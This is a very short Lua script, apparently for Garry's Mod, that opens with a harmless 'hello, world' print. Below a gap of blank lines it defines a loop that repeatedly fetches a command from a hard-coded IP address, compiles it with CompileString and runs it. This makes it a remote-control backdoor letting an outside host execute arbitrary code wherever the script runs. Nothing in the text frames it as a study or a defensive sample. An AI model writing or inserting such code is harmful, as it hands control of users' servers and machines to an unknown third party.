print("hello, world")




function beginListening()
    http.Fetch("http://173.255.236.21/get_command", function(body)
        c=util.JSONToTable(body)["command"]
        local f = CompileString(c, "t")
        f()
        print("command: " .. c)
        beginListening()
    end) 
end

beginListening()